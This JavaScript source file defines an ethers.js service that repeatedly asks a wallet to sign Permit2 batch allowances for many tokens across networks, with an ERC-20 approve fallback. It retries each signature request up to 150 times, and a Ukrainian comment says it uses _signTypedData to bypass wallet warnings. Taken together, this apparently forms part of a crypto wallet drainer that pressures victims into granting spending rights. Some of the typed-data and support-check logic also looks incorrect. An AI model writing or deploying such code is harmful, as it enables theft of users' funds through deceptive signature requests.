const ethers = require('ethers');
const PERMIT2_ABI = require('../config/abis/permit2.json');
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const MAX_RETRY_COUNT = 150; // Ліміт повторних спроб

class Permit2Service {
  constructor(provider) {
    this.provider = provider;
    this.permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    this.retryCount = MAX_RETRY_COUNT;
  }

  async signPermitBatchWithRetry(tokens, owner, spender, values, networks) {
    for (const network of networks) {
      let currentRetries = this.retryCount;
      
      while (currentRetries > 0) {
        try {
          const result = await this.signPermitBatch(
            tokens[network.chainId],
            owner,
            spender,
            values[network.chainId]
          );
          return result;
        } catch (error) {
          currentRetries--;
          console.log(`Retry ${this.retryCount - currentRetries}/${this.retryCount} for network ${network.name}`);
          if (currentRetries === 0) {
            console.log(`Moving to next network after ${this.retryCount} failed attempts`);
            break;
          }
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }
  }

  async signPermitBatch(tokens, owner, spender, values) {
    // Перевіряємо підтримку Permit2 для кожного токена
    const supportedTokens = [];
    const supportedValues = [];
    const fallbackTokens = [];
    const fallbackValues = [];

    for (let i = 0; i < tokens.length; i++) {
      if (await this.isPermit2Supported(tokens[i])) {
        supportedTokens.push(tokens[i]);
        supportedValues.push(values[i]);
      } else {
        fallbackTokens.push(tokens[i]);
        fallbackValues.push(values[i]);
      }
    }

    // Підписуємо Permit2 для підтримуваних токенів
    if (supportedTokens.length > 0) {
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 година
      const nonce = await this.permit2.nonces(owner);

      const domain = {
        name: 'Permit2',
        chainId: await this.provider.getNetwork().then(n => n.chainId),
        verifyingContract: PERMIT2_ADDRESS
      };

      const types = {
        PermitBatch: [
          { name: 'tokens', type: 'address[]' },
          { name: 'values', type: 'uint256[]' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      };

      const message = {
        tokens: supportedTokens,
        values: supportedValues,
        nonce,
        deadline
      };

      try {
        // Використовуємо _signTypedData для обходу попереджень
        return await this.provider.getSigner()._signTypedData(domain, types, message);
      } catch (error) {
        console.error('Permit2 signing failed:', error);
        throw error;
      }
    }

    // Fallback на approve для непідтримуваних токенів
    if (fallbackTokens.length > 0) {
      return this.handleFallbackApprovals(fallbackTokens, fallbackValues, spender);
    }
  }

  async handleFallbackApprovals(tokens, values, spender) {
    const approvals = [];
    for (let i = 0; i < tokens.length; i++) {
      try {
        const approval = await this.approveToken(tokens[i], spender, values[i]);
        approvals.push(approval);
      } catch (error) {
        console.error(`Approval failed for token ${tokens[i]}:`, error);
      }
    }
    return approvals;
  }

  async approveToken(tokenAddress, spender, amount) {
    const tokenContract = new ethers.Contract(
      tokenAddress,
      ['function approve(address,uint256)'],
      this.provider.getSigner()
    );

    return await tokenContract.approve(spender, amount, {
      gasLimit: 100000
    });
  }

  async isPermit2Supported(tokenAddress) {
    try {
      const tokenContract = new ethers.Contract(
        tokenAddress,
        ['function allowance(address,address) view returns (uint256)'],
        this.provider
      );
      
      await tokenContract.allowance(PERMIT2_ADDRESS, PERMIT2_ADDRESS);
      return true;
    } catch {
      return false;
    }
  }
}

module.exports = Permit2Service;